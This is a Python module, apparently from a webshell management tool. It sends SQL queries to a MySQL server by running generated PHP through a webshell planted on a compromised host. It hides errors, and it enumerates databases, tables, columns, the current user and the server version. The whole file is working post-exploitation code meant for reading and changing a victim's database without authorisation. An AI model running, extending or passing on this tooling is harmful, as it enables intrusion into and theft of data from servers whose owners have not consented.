"""MySQL access proxied through the webshell, via ``mysqli``.

Rows are returned with ASCII unit/record separators rather than v1's comma
join, so values that themselves contain commas no longer corrupt the output.
"""

from __future__ import annotations

from .. import log
from ..core.php import php_string
from ..core.webshell import WebShell
from ..exceptions import WebshellError

_COL_SEP = "\x1f"  # ASCII Unit Separator
_ROW_SEP = "\x1e"  # ASCII Record Separator


def _sql_quote(value: str) -> str:
    """Return ``value`` as an escaped MySQL string literal."""
    escaped = value.replace("\\", "\\\\").replace("'", "\\'")
    return f"'{escaped}'"


class MysqlManager:
    def __init__(self, ws: WebShell, host: str, username: str, password: str):
        self.ws = ws
        self.host = host
        self.username = username
        self.password = password

    def _connect_prelude(self) -> str:
        return (
            "error_reporting(0);"
            f"$c=new mysqli({php_string(self.host)},{php_string(self.username)},"
            f"{php_string(self.password)});"
        )

    def query(self, sql: str) -> list[list[str]]:
        """Run a SQL statement and return rows as lists of string columns."""
        code = (
            self._connect_prelude()
            + "if($c->connect_errno){echo 'ERR:'.$c->connect_error;}else{"
            f"$r=$c->query({php_string(sql)});"
            "if($r===true){echo 'OK';}elseif($r){"
            f"while($row=$r->fetch_row()){{echo implode('{_COL_SEP}',$row).'{_ROW_SEP}';}}"
            "}$c->close();}"
        )
        result = self.ws.run_php(code)
        if result.startswith("ERR:"):
            raise WebshellError(result[4:])
        rows = [r for r in result.split(_ROW_SEP) if r]
        return [row.split(_COL_SEP) for row in rows]

    def check_connection(self) -> bool:
        try:
            self.query("SELECT 1")
            return True
        except WebshellError as exc:
            log.error(f"MySQL connection failed: {exc}")
            return False

    def _scalar(self, sql: str) -> str:
        rows = self.query(sql)
        return rows[0][0] if rows and rows[0] else ""

    def current_database(self) -> str:
        return self._scalar("SELECT DATABASE()")

    def current_user(self) -> str:
        return self._scalar("SELECT CURRENT_USER()")

    def version(self) -> str:
        return self._scalar("SELECT VERSION()")

    def databases(self) -> list[str]:
        return [r[0] for r in self.query("SELECT schema_name FROM information_schema.schemata")]

    def tables(self, database: str) -> list[str]:
        return [
            r[0]
            for r in self.query(
                "SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema={_sql_quote(database)}"
            )
        ]

    def columns(self, database: str, table: str) -> list[str]:
        return [
            r[0]
            for r in self.query(
                "SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema={_sql_quote(database)} "
                f"AND table_name={_sql_quote(table)}"
            )
        ]
